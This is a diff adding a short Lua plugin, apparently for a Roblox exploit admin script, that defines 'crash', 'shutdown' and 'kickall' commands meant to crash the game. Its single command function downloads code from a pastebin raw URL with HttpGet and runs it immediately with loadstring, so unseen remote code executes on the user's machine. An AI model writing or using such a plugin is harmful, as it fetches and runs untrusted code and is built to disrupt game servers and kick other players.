@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "Crash",
+	["PluginDescription"] = " Crash the game",
+	["Commands"] = {
+		["shutdown/crash/kickall"] = {
+			["Description"] = "oh no! Wheres my head?!",
+			["Aliases"] = {'crash', 'shutdown', 'kickall'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet(('https://pastebin.com/raw/J4nmWQJA'),true))()
+			end,
+		},
+	},
+}
+
+return Plugin
